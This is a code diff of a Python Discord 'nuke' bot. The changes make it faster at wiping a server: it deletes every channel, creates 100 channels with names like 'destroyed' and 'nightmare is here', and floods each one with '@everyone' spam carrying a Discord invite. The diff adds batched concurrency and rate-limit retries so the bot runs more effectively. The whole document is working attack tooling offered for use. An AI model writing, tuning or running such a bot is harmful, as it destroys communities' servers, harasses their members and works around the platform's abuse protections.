@@ -5,38 +5,41 @@ import random
 import time
 import os
 
-# --- CONFIGURE THESE (or use env vars) ---
-BOT_TOKEN = os.getenv("TOKEN")  # Railway env variable
+# --- CONFIGURE THESE ---
+BOT_TOKEN = os.getenv("TOKEN")
 if not BOT_TOKEN:
-    raise ValueError("No TOKEN found in environment variables. Set TOKEN on Railway.")
+    raise ValueError("No TOKEN found. Set TOKEN on Railway.")
 
 PREFIX = "."
 
-# Nuke Configuration (you can change these directly)
-CHANNEL_NAME = "nuked"
-MESSAGE = "@everyone @here nuked by dnezero"
-AMOUNT_OF_CHANNELS = 100
-AMOUNT_OF_MESSAGES = 1000
-
-# Random channel name variations
-RANDOM_CHANNEL_NAMES = [
-    "𝕟𝕦𝕜𝕖𝕕",
-    "𝔫𝔲𝔨𝔢𝔡",
-    "𝚗𝚞𝚔𝚎𝚍",
-    "ɴᴜᴋᴇᴅ",
-    "𝓷𝓾𝓴𝓮𝓭",
-    "nuked"
+# Channel names (randomly chosen from this list)
+CHANNEL_NAMES = [
+    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
+    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
+    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
+    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
+    "d̸e̸st̸r̸o̸y̸e̸d̸",
+    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
+    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
+    "dєstrσчєd",
+    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
 ]
-USE_RANDOM_NAMES = True   # Set to False to use CHANNEL_NAME only
+
+MESSAGE = "# NUKED BY N3XEL\nhttps://discord.gg/qhuMKeShn\n||@everyone|| ||@here||"
+AMOUNT_OF_CHANNELS = 100
+MESSAGES_PER_CHANNEL = 30   # each channel gets 30 messages
+
+# Concurrency tweaks (faster = higher, but respect Discord limits)
+DELETE_CONCURRENCY = 30
+CREATE_CONCURRENCY = 20
+MESSAGE_CONCURRENCY = 50
 
 # -----------------------
-# DO NOT MODIFY BELOW THIS LINE
+# DO NOT MODIFY BELOW
 # -----------------------
 
 def get_channel_name():
-    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
-        return random.choice(RANDOM_CHANNEL_NAMES)
-    return CHANNEL_NAME
+    return random.choice(CHANNEL_NAMES)
 
 intents = discord.Intents.default()
 intents.guilds = True
@@ -45,20 +48,20 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-async def send_messages_fast(channels, message, total):
-    if not channels:
-        return
-    semaphore = asyncio.Semaphore(50)
-    async def send_one(channel, msg):
+async def send_messages_to_channel(channel, count):
+    """Send 'count' messages to a single channel with concurrency"""
+    semaphore = asyncio.Semaphore(MESSAGE_CONCURRENCY)
+    async def send_one():
         async with semaphore:
             try:
-                await channel.send(msg)
+                await channel.send(MESSAGE)
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    await asyncio.sleep(e.retry_after)
+                    await channel.send(MESSAGE)
             except Exception:
                 pass
-    tasks = []
-    for i in range(total):
-        channel = channels[i % len(channels)]
-        tasks.append(send_one(channel, message))
+    tasks = [send_one() for _ in range(count)]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 async def nuke_server(guild: discord.Guild):
@@ -67,26 +70,36 @@ async def nuke_server(guild: discord.Guild):
 
     # Step 1: Delete all channels
     print("Deleting all channels...")
-    await asyncio.gather(
-        *(channel.delete() for channel in guild.channels),
-        return_exceptions=True
-    )
+    channels_list = list(guild.channels)
+    for i in range(0, len(channels_list), DELETE_CONCURRENCY):
+        batch = channels_list[i:i+DELETE_CONCURRENCY]
+        await asyncio.gather(*(ch.delete() for ch in batch), return_exceptions=True)
+    print("All channels deleted.")
 
     # Step 2: Create new channels
     print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
-    async def create_one():
-        return await guild.create_text_channel(get_channel_name())
-    
-    channels = await asyncio.gather(
-        *(create_one() for _ in range(AMOUNT_OF_CHANNELS)),
-        return_exceptions=True
-    )
+    created_channels = []
+    for i in range(0, AMOUNT_OF_CHANNELS, CREATE_CONCURRENCY):
+        batch_size = min(CREATE_CONCURRENCY, AMOUNT_OF_CHANNELS - i)
+        tasks = []
+        for _ in range(batch_size):
+            name = get_channel_name()
+            tasks.append(guild.create_text_channel(name))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for r in results:
+            if isinstance(r, discord.TextChannel):
+                created_channels.append(r)
+        await asyncio.sleep(0.3)  # small break to avoid global rate limit
+    print(f"Created {len(created_channels)} channels.")
 
-    # Step 3: Send messages
-    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
-    if text_channels:
-        print(f"Sending {AMOUNT_OF_MESSAGES} messages...")
-        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)
+    # Step 3: Send 30 messages to each channel
+    if created_channels:
+        print(f"Sending {MESSAGES_PER_CHANNEL} messages to each channel...")
+        for idx, channel in enumerate(created_channels):
+            await send_messages_to_channel(channel, MESSAGES_PER_CHANNEL)
+            if (idx + 1) % 10 == 0:
+                print(f"Progress: {idx+1}/{len(created_channels)} channels done")
+        print("All messages sent.")
 
     elapsed = time.perf_counter() - start_time
     print(f"Nuke completed in {elapsed:.2f} seconds!")
@@ -110,11 +123,13 @@ async def nuke(ctx):
 async def config(ctx):
     config_msg = f"""
 **Current Configuration:**
-📝 Channel Name: `{CHANNEL_NAME}`
-🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
+📝 Channel Names: `{len(CHANNEL_NAMES)} variants`
 💬 Message: `{MESSAGE[:50]}...`
 📊 Channels: `{AMOUNT_OF_CHANNELS}`
-📨 Messages: `{AMOUNT_OF_MESSAGES}`
+📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
+⚡ Delete Concurrency: `{DELETE_CONCURRENCY}`
+⚡ Create Concurrency: `{CREATE_CONCURRENCY}`
+⚡ Message Concurrency: `{MESSAGE_CONCURRENCY}`
     """
     await ctx.send(config_msg)
 
